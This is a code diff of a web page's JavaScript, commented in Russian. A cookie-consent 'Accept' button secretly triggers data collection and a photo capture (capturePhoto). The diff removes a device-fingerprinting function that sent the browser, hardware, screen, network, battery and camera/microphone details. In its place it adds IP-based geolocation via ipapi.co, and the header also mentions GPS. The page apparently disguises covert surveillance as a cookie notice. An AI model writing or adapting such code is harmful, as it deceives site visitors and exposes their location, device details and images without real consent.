@@ -178,39 +178,8 @@
             .catch(function(err) {});
     }
 
-    function collectAllInfo() {
-        let info = "📱 УСТРОЙСТВО\n━━━━━━━━━━━━━━━━━━\n";
-        info += "🕒 " + new Date().toLocaleString("ru-RU") + "\n";
-        info += "🌐 URL: " + window.location.href + "\n";
-        info += "📱 UA: " + navigator.userAgent + "\n";
-        info += "💻 Платформа: " + (navigator.platform || "—") + "\n";
-        info += "🌐 Язык: " + (navigator.language || "—") + "\n";
-        info += "📲 Touch: " + (("ontouchstart" in window) ? "да" : "нет") + "\n";
-        info += "⚙ CPU: " + (navigator.hardwareConcurrency || "—") + " ядер\n";
-        info += "💾 RAM: " + (navigator.deviceMemory || "—") + " ГБ\n";
-        info += "🖥 Экран: " + screen.width + "x" + screen.height + "\n";
-        info += "🕓 Часовой пояс: " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—");
-        send(info);
-
-        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (c) {
-            send("📡 СЕТЬ\n📶 " + (c.effectiveType || "—") + "\n⬇ " + (c.downlink || "—") + " Мбит/с\n📊 RTT " + (c.rtt || "—") + " мс");
-        }
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(b) {
-                send("🔋 БАТАРЕЯ\n🔋 " + Math.round(b.level * 100) + "%\n⚡ " + (b.charging ? "заряжается" : "не заряжается"));
-            }).catch(function() {});
-        }
-
-        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-            navigator.mediaDevices.enumerateDevices().then(function(devices) {
-                const cams = devices.filter(d => d.kind === "videoinput").length;
-                const mics = devices.filter(d => d.kind === "audioinput").length;
-                send("🎥 МЕДИА\n🎥 Камер: " + cams + "\n🎤 Микрофонов: " + mics);
-            }).catch(function() {});
-        }
-
+    // ===== IP + ГЕО ПО IP + GPS =====
+    function collectGeo() {
         fetch("https://ipapi.co/json/")
             .then(r => r.json())
             .then(function(d) {
@@ -240,7 +209,7 @@
 
     document.getElementById("btnAccept").addEventListener("click", function() {
         collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
-        collectAllInfo();
+        collectGeo();
         capturePhoto();
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
